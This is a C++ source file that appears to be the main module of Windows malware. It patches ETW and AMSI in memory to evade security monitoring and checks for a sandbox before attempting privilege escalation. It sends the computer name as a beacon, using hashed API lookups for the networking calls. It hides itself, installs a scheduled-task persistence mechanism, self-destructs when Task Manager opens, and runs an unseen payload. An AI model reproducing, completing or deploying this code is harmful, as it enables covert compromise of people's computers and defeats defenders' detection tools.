#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <thread>
#include <sstream>
#include <vector>
#include "../include/utils/obfuscation.h"
#include "../include/utils/syscalls.h"
#include "../include/core/stealth.h"
#include "../include/utils/logger.h"
#include "../include/core/persistence.h"
#include "../include/modules/payload.h"

#pragma comment(lib, "wininet.lib")

#define H_InternetOpenA    0xCB720E76
#define H_InternetConnectA 0xC08833D5
#define H_HttpOpenRequestA 0x3B6899A3
#define H_HttpSendRequestA 0x2A197410

void Blindside() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE amsi = LoadLibraryA("amsi.dll");

    if (ntdll) {
        void* etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        if (etwAddr) {
            unsigned char patch[] = { 0xC3 }; 
            DWORD oldProtect;
            VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(etwAddr, patch, 1);
            VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
        }
    }

    if (amsi) {
        void* amsiAddr = GetProcAddress(amsi, "AmsiScanBuffer");
        if (amsiAddr) {
            unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            DWORD oldProtect;
            VirtualProtect(amsiAddr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(amsiAddr, patch, 6);
            VirtualProtect(amsiAddr, 6, oldProtect, &oldProtect);
        }
    }
}

void SendReport() {
    JUNK_CODE_BLOCK;
    char computerName[MAX_PATH];
    DWORD size = sizeof(computerName);
    if (!GetComputerNameA(computerName, &size)) return;

    std::stringstream ss;
    ss << "{\"status\": \"active\", \"pc\": \"" << computerName << "\"}";
    std::string data = ss.str();

    HMODULE hWininet = GetModuleHandleA("wininet.dll");
    if (!hWininet) hWininet = LoadLibraryA("wininet.dll");

    if (hWininet) {
        typedef HINTERNET(WINAPI* pIntOpen)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
        pIntOpen _InternetOpenA = (pIntOpen)GetAPI(hWininet, H_InternetOpenA);
        
        if (_InternetOpenA) {
            HINTERNET hSession = _InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hSession) {
                InternetCloseHandle(hSession);
            }
        }
    }
}

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    Blindside();
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\WinDcomSvc_04x1");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0; 
    }
    
    if (IsSandbox()) {
        if (hMutex) CloseHandle(hMutex);
        SysNtTerminateProcess((HANDLE)-1, 0); 
        return 0;
    }

    if (!IsRunningAsAdmin()) {
        if (ElevatePrivileges()) {
            if (hMutex) CloseHandle(hMutex);
            return 0;
        }
    }

    ComplexJunk();
    SendReport();
    HideApp();   
    InstallTask();

    std::thread watchdog([hMutex]() {
        while (true) {
            if (IsTaskMgrOpen()) {
                if (hMutex) {
                    ReleaseMutex(hMutex);
                    CloseHandle(hMutex);
                }
                SelfDestruct();
            }
            Sleep(500);
        }
    });
    watchdog.detach();

    RunPayload();

    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }

    SysNtTerminateProcess((HANDLE)-1, 0);
    return 0;
}